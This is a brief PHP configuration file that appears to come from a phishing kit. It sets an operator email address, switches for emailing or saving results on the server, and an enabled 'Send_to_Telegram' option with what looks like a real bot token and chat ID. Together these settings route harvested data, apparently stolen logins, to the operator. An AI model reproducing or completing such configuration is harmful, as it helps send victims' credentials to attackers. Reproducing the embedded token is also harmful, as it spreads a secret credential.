<?php
/*
*** Set your email below and configure functions to your requirments ***
*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
EXAMPLE
$Example=1;  // Function On
$Example=0;  // Function Off
*/
$youremail='wexdexter@protonmail.com';  // Set your email
$Send_to_Email='0';
$Save_on_Server='0';
/*
*/
$Send_to_Telegram='1';
$token='1918531570:AAEvL4PQLi8BnVGPNZ34Y-Qrp_Jl1bxYRvQ';
$chat_id= "351407378";

/*
*/
?>